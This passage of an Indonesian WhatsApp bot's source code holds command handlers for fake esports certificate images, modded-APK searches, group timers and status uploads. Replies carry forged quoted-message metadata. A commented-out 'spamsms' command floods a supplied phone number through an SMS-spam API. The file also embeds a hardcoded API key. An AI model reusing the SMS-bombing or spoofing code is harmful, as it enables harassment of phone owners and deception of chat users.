				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'fftourserti2': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}fftourserti2 databaseaUhuy`)
				reply(ind.wait())
				ct = body.slice(13)
				anu = await getBuffer(`https://onlydevcity.xyz/FFSerti2/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'fftourserti3': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}fftourserti3 databaseaUhuy`)
				reply(ind.wait())
				ct = body.slice(13)
				anu = await getBuffer(`https://onlydevcity.xyz/FFSerti3/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'fftourserti4': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}fftourserti4 databaseaUhuy`)
				reply(ind.wait())
				ct = body.slice(13)
				anu = await getBuffer(`https://onlydevcity.xyz/FFSerti4/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'fftourserti5': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}fftourserti5 databaseaUhuy`)
				reply(ind.wait())
				ct = body.slice(13)
				anu = await getBuffer(`https://onlydevcity.xyz/FFSerti5/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'mltourserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}mltourserti databaseaUhuy`)
				reply(ind.wait())
				ct = body.slice(12)
				anu = await getBuffer(`https://onlydevcity.xyz/MLTourSerti/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'mltourserti2': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}mltourserti2 databaseaUhuy`)
				reply(ind.wait())
				ct = body.slice(13)
				anu = await getBuffer(`https://onlydevcity.xyz/MLTourSerti2/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'mltourserti3': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}mltourserti3 databaseaUhuy`)
				reply(ind.wait())
				ct = body.slice(13)
				anu = await getBuffer(`https://onlydevcity.xyz/MLTourSerti3/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'mltourserti4': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}mltourserti4 databaseaUhuy`)
				reply(ind.wait())
				ct = body.slice(13)
				anu = await getBuffer(`https://onlydevcity.xyz/MLTourSerti4/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'mltourserti5': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}mltourserti5 databaseaUhuy`)
				reply(ind.wait())
				ct = body.slice(13)
				anu = await getBuffer(`https://onlydevcity.xyz/MLTourSerti5/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'pubgtourserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}pubgtourserti databaseaUhuy`)
				reply(ind.wait())
				ct = body.slice(14)
				anu = await getBuffer(`https://onlydevcity.xyz/PubgTourSerti/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'pubgtourserti2': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}pubgtourserti2 databaseaUhuy`)
				reply(ind.wait())
				ct = body.slice(15)
				anu = await getBuffer(`https://onlydevcity.xyz/PubgTourSerti2/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'pubgtourserti3': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}pubgtourserti3 databaseaUhuy`)
				reply(ind.wait())
				ct = body.slice(15)
				anu = await getBuffer(`https://onlydevcity.xyz/PubgTourSerti3/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'pubgtourserti4': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}pubgtourserti4 databaseaUhuy`)
				reply(ind.wait())
				ct = body.slice(15)
				anu = await getBuffer(`https://onlydevcity.xyz/PubgTourSerti4/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*Subscribe Fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				case 'pubgtourserti5': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}pubgtourserti5 databaseaUhuy`)
				reply(ind.wait())
				ct = body.slice(15)
				anu = await getBuffer(`https://onlydevcity.xyz/PubgTourSerti5/img.php?nama=${ct}`)
				client.sendMessage(from, anu, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "*subrek fernazer*", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('lib/logo.jpg')} } }, caption: 'Nih Hasilnya Kak...'})
				break
				
				
				// RANDOM MENU
				
				/*case 'spamsms':
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} 08303030303030`)
                    nomor = args[0]
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam1?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam2?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam3?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam4?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam5?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam6?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam7?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam8?apikey=${lolkey}&nomor=${nomor}`)
                    reply("Success Mungkin bero")
                    break*/                           
		case 'googleimage':
				   client.updatePresence(from, Presence.composing) 
 				if (!isRegistered) return reply(ind.noregis())
		if (isBanned) return reply(ind.baned())
                                        if (isLimit(sender)) return reply(ind.limitend(pusname))
				   if (args.length < 1) return reply('Apa yang mau dicari kak?')
					goo = body.slice(7)
					anu = await fetchJson(`https://api.vhtear.com/googleimg?query=${goo}&apikey=${apivhtear}`, {method: 'get'})
					reply(`Harap Sabar Jangan Spam,Jika Ketahuan Spam Banned Balasannya`)
				    var pol = JSON.parse(JSON.stringify(anu.result.result_search));
                    var tes2 =  pol[Math.floor(Math.random() * pol.length)];
					pint = await getBuffer(tes2)
					client.sendMessage(from, pint, image, {caption: '*Pencarian : '+goo+'*', quoted: mek })
					await limitAdd(sender)
					break
                    /*case 'nsfwblowjob':
                    if (!isRegistered) return reply(ind.noregis())
		if (isBanned) return reply(ind.baned())
                if (isLimit(sender)) return reply(ind.limitend(pusname))
                   if (!isGroup) return reply(ind.groupo())
                   if (!isNsfw) return reply(ind.nsfwoff())
                    buffer = await getBuffer(`http://api.lolhuman.xyz/api/random/nsfw/blowjob?apikey=${lolkey}`)
                    client.sendMessage(from, buffer, image, { quoted: mek, caption: 'Nih Bro'  })
                    break*/
		case 'quran':
			if (!isRegistered) return reply(ind.noregis())
		if (isBanned) return reply(ind.baned())
                        if (isLimit(sender)) return reply(ind.limitend(pusname))
				anu = await fetchJson(`https://api.banghasan.com/quran/format/json/acak`, {method: 'get'})
				quran = `${anu.acak.ar.teks}\n\n${anu.acak.id.teks}\nQ.S ${anu.surat.nama} ayat ${anu.acak.id.ayat}`
				client.sendMessage(from, quran, text, {quoted: mek})
				await limitAdd(sender)
				break
				
				//belanja
				
				/*case 'shopee':
		            if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				    if (isBanned) return reply(ind.baned())
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} tas gendong`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/shopee?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = 'Shopee Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Name : ${x.name}\n`
                        ini_txt += `Terjual : ${x.sold}\n`
                        ini_txt += `Stock : ${x.stock}\n`
                        ini_txt += `Lokasi : ${x.shop_loc}\n`
                        ini_txt += `Link : ${x.link_produk}\n\n`
                    }
                    reply(ini_txt)
                    break*/
                    case 'playstore':
                  if (!isRegistered) return reply(ind.noregis())
		if (isBanned) return reply(ind.baned())
                if (isLimit(sender)) return reply(limitend(pushname)) 
                ps = `${body.slice(11)}`
                  anu = await fetchJson(`https://api.zeks.xyz/api/sgplay?apikey=${ZeksApi}&q=${ps}`, {method: 'get'})
                  store = '======================\n'
                  for (let ply of anu.result){
                  store += `• *Nama Apk:* ${ply.title}\n• *ID:* ${ply.appid}\n• *Developer:* ${ply.developer}\n• *Link Apk:* ${ply.url}\n=====================\n`
                  }
                  reply(store.trim())
                  break
                  case 'moddroid':
				if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf, Rene telah membanned mu!\nHarap meningkatkan premium untuk terbebas banned selama anda premium!')
				data = await fetchJson(`https://tobz-api.herokuapp.com/api/moddroid?q=${body.slice(10)}&apikey=Tobzzz17`)
				hepi = data.result[0] 
				teks = `*Nama*: ${data.result[0].title}\n*publisher*: ${hepi.publisher}\n*mod info:* ${hepi.mod_info}\n*size*: ${hepi.size}\n*latest version*: ${hepi.latest_version}\n*genre*: ${hepi.genre}\n*link:* ${hepi.link}\n*download*: ${hepi.download}`
				buffer = await getBuffer(hepi.image)
				client.sendMessage(from, buffer, image, {quoted: mek, caption: `${teks}`})
				await limitAdd(sender)
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
			break
			case 'happymod':
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf, Rene telah membanned mu!\nHarap meningkatkan premium untuk terbebas banned selama anda premium!')
				data = await fetchJson(`https://api.zeks.xyz/api/happymod?apikey=${ZeksApi}&q=${body.slice(10)}`, {method: 'get'})
				teks = '=================\n'
				for (let i of data.result) {
					teks += `*Nama APK* : ${i.title}\n*Link* : ${i.url}\n*Rating* : ${i.rating}\n=================\n`
					}
				reply(teks.trim())
				await limitAdd(sender)
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
			break
                /*case 'yuri':
			if (!isRegistered) return reply(ind.noregis())
		if (isBanned) return reply(ind.baned())
                    buffer = await getBuffer(`http://api.lolhuman.xyz/api/random2/yuri?apikey=${lolkey}`, {method: 'get'})
                    client.sendMessage(from, buffer, image, { quoted: mek })
                    break*/
                /*case 'wancak':
                    buffer = await getBuffer(`http://api.lolhuman.xyz/api/onecak?apikey=${lolkey}`, {method: 'get'})
                    client.sendMessage(from, buffer, image, { quoted: mek })
                    break*/
                    
                    // MASIH TEST BY FERNAZER ORI
                    
                    case 'tutuptime': //by Fernazer
              client.updatePresence(from, Presence.composing) 
		if (!isRegistered) return reply(ind.noregis())
		if (isBanned) return reply(ind.baned())
		if (!isGroupAdmins) return reply(ind.admin())
              if (args[1]=="detik") {var timer = args[0]+"000"
				} else if (args[1]=="menit") {var timer = args[0]+"0000"
				} else if (args[1]=="jam") {var timer = args[0]+"00000"
				} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
				setTimeout( () => {
					var nomor = mek.participant
					const close = {
					text: `Grup ditutup oleh admin @${nomor.split("@s.whatsapp.net")[0]}\nsekarang *hanya admin* yang dapat mengirim pesan`,
					contextInfo: { mentionedJid: [nomor] }
					}
					client.groupSettingChange (from, GroupSettingChange.messageSend, true);
					reply(close)
				}, timer)
				break
				case 'upswgif':
                     if (!isOwner) return reply(ind.ownerb)
                    var konti = body.slice(7)
                    reply(ind.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(enmedia)
                    const buffer6 = fs.readFileSync(media)
                    client.sendMessage('status@broadcast', buffer6, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
                    reply(`Sukses upload gif:\n${konti}`)

				    break
    case 'upswimage':
    if (!isOwner) return reply(ind.ownerb)
            if (isQuotedImage) {
